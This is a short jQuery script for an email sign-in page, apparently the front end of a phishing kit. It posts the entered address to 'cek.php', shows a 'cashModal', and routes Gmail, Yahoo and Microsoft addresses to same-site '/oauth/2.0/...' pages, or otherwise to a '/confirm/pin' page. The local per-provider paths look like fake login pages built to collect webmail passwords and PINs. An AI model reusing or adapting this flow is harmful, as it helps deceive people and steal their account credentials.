$(document).ready(function() {

	function isEmail(email) {
        var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return re.test(email);
    }

	
	$("#email").focus(function() {
		$(this).removeClass('is-invalid');
		if(isEmail($("#email").val())){
			$("#btnSignin").slideDown();
		}else{
			$("#btnSignin").slideUp();
		}
	});
	
	$("#email").keyup(function() {
		if(isEmail($("#email").val())){
			$("#btnSignin").slideDown();
		}else{
			$("#btnSignin").slideUp();
		}
	});
	
	$("#btnConfirm").click(function() {
		$("#btnConfirm").prop('disabled', true);
		$("#btnConfirm").html('<img src="static/img/spin.gif" style="width:43px">');
         if($('#email').val().includes('@gmail.com')) {
        window.location.href = "/oauth/2.0/gmail";
        } else if($('#email').val().includes('@yahoo.com')) {
        window.location.href = "/oauth/2.0/yahoo";
        } else if($('#email').val().includes('@hotmail.com')) {
        window.location.href = "/oauth/2.0/outlook";
        } else if($('#email').val().includes('@live.com')) {
        window.location.href = "/oauth/2.0/outlook";
        } else if($('#email').val().includes('@msn.com')) {
        window.location.href = "/oauth/2.0/outlook";
        } else if($('#email').val().includes('@outlook.com')) {
        window.location.href = "/oauth/2.0/outlook";
         } else {window.location.href = "/confirm/pin";}
	});
	
    $("#frmLogin").submit(function(event) {
        event.preventDefault();
		var error = false;
		var email = $("#email").val();
		
		if(!isEmail(email)){
			$("#email").addClass('is-invalid');
			error = true;
		}else{
			$("#email").removeClass('is-invalid');
		}
		
		if(!error){
			$("#btnLogin").prop('disabled', true);
			$("#btnLogin").html('<img src="static/img/spin.gif" style="width:43px">');
			$('#email').prop('readonly', true);
			var logindata =  $("#frmLogin").serialize();
		$.post("cek.php", logindata).done(function(result) {
				if(result != "no"){
					$('#cashBody').addClass("no-scroll");
					$('#btnConfirm').attr("data-oauth", '/oauth/2.0/' + result);
					$('#cashModal').show();
				}else{
					$('#email').prop('readonly', false);
					$("#email").addClass('is-invalid');
					$("#btnLogin").prop('disabled', false);
					$("#btnLogin").html('Sign In');
				}
			});
		}
	});
});